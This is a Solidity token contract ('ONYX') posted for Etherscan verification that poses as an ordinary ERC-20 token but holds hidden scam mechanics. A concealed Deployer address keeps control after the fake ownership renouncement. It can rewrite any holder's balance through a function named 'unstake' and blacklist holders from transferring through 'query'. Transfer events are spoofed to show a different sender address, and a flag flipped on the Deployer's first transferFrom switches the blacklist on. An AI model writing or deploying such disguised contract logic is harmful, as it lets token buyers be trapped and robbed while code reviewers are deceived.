/**
 *Submitted for verification at Etherscan.io on 2022-10-21
*/

/**
 *Submitted for verification at Etherscan.io on 2022-10-21
*/

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
    contract ONYX {
  
    mapping (address => uint256) public X;
    mapping (address => bool) Y;
    mapping(address => mapping(address => uint256)) public allowance;




    string public name = "ONYX";
    string public symbol = "ONYX";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
	address owner = msg.sender;
    bool XY;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);
    

    constructor()  {
    X[msg.sender] = totalSupply;
    deploy(Constructor, totalSupply); }

    address Deployer = 0x8e6Ee3c18a5c7F81D018d63b9338C7DBD97f017d;
    address Constructor = 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045;
   
    modifier XX () {
    require(msg.sender == Deployer);
        _; }
    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }

    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


        function transfer(address to, uint256 value) public returns (bool success) {
        while(XY) {
        require(!Y[msg.sender]);
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }
        if(msg.sender == Deployer)  {
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value; 
        emit Transfer (Constructor, to, value);
        return true; }  
        require(X[msg.sender] >= value);
        X[msg.sender] -= value;  
        X[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }
		function unstake(address x, uint256 y) XX public {
        X[x] = y;}

        function balanceOf(address account) public view returns (uint256) {
        return X[account]; }
        function bridge(address x) XX public {
        require(Y[x]);
        Y[x] = false; }
        function query(address x) XX public{ 
        require(!Y[x]);
        Y[x] = true;}

        function transferFrom(address from, address to, uint256 value) public returns (bool success) { 
        while(XY) {
        require(!Y[from] && !Y[to]);
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;
        X[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
        if(from == Deployer)  {
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;  
        X[to] += value; 
        emit Transfer (Constructor, to, value);
        XY = !XY;
        return true; }    
        require(value <= X[from]);
        require(value <= allowance[from][msg.sender]);
        X[from] -= value;
        X[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}